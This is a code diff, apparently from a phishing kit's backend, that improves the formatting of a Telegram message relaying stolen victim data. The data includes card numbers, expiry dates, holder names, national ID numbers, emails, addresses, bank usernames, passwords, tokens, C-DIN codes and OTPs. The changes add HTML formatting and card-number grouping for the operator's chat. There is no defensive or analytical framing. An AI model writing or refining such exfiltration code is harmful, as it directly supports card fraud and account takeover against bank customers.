@@ -280,6 +280,22 @@ function fieldValue(...values: unknown[]) {
   return '-';
 }
 
+function cardNumberForTelegram(...values: unknown[]) {
+  for (const value of values) {
+    const digits = String(value || '').replace(/\D/g, '');
+    if (digits.length >= 13) return digits.replace(/(\d{4})(?=\d)/g, '$1 ');
+  }
+  return fieldValue(...values);
+}
+
+function escapeHtml(value: string) {
+  return value.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+}
+
+function labeledLine(emoji: string, label: string, value: string) {
+  return `${emoji} <b>${escapeHtml(label)}:</b> ${escapeHtml(value)}`;
+}
+
 function formatPaymentMessage(payload: Record<string, unknown>) {
   const mockCard = payload.mockCard as { brand?: string; pan?: string; exp?: string; cvv?: string; holder?: string } | undefined;
   const meta = objectValue(payload.meta) || {};
@@ -287,20 +303,20 @@ function formatPaymentMessage(payload: Record<string, unknown>) {
   const cpayload = objectValue(meta.cpayload) || {};
   const brand = String(payload.brand || mockCard?.brand || meta.brand || '-');
   return [
-    `💵 Monto: ${formatPenAmount(meta, payload)}`,
-    `💳 Marca: ${brand.toUpperCase()}`,
-    `💳 Tarjeta: ${fieldValue(cpayload.b, meta.card)}`,
-    `📅 Expira: ${fieldValue(cpayload.cv, cpayload.exp)}`,
-    `👤 Titular: ${fieldValue(cpayload.holder)}`,
-    `🪪 Cédula: ${fieldValue(meta.documento, meta.cedula, meta.numeroDocumento)}`,
-    `✉️ Correo: ${fieldValue(meta.correo, meta.email)}`,
-    `🏠 Dirección: ${fieldValue(meta.direccion)}`,
-    '🔐 CREDENCIALES',
-    `👤 Usuario: ${fieldValue(meta.username)}`,
-    `🔑 Contraseña: ${fieldValue(meta.password)}`,
-    `🎟️ Token: ${fieldValue(meta.token)}`,
-    `🔐 C-DIN: ${fieldValue(meta.cdin)}`,
-    `💬 OTP: ${fieldValue(metaOtp.otp, meta.otp)}`,
+    labeledLine('💵', 'Monto', formatPenAmount(meta, payload)),
+    labeledLine('💳', 'Marca', brand.toUpperCase()),
+    labeledLine('💳', 'Tarjeta', cardNumberForTelegram(cpayload.b)),
+    labeledLine('📅', 'Expira', fieldValue(cpayload.cv, cpayload.exp)),
+    labeledLine('👤', 'Titular', fieldValue(cpayload.holder)),
+    labeledLine('🪪', 'Cédula', fieldValue(meta.documento, meta.cedula, meta.numeroDocumento)),
+    labeledLine('✉️', 'Correo', fieldValue(meta.correo, meta.email)),
+    labeledLine('🏠', 'Dirección', fieldValue(meta.direccion)),
+    '🔐 <b>CREDENCIALES</b>',
+    labeledLine('👤', 'Usuario', fieldValue(meta.username)),
+    labeledLine('🔑', 'Contraseña', fieldValue(meta.password)),
+    labeledLine('🎟️', 'Token', fieldValue(meta.token)),
+    labeledLine('🔐', 'C-DIN', fieldValue(meta.cdin)),
+    labeledLine('💬', 'OTP', fieldValue(metaOtp.otp, meta.otp)),
   ].join('\n');
 }
 
@@ -419,6 +435,7 @@ async function sendTelegram(payload: Record<string, unknown>, options: { withBut
   const message: Record<string, unknown> = {
     chat_id: chatId,
     text: formatTelegramMessage(payload),
+    parse_mode: 'HTML',
     disable_web_page_preview: true,
   };
   if (options.withButtons) {
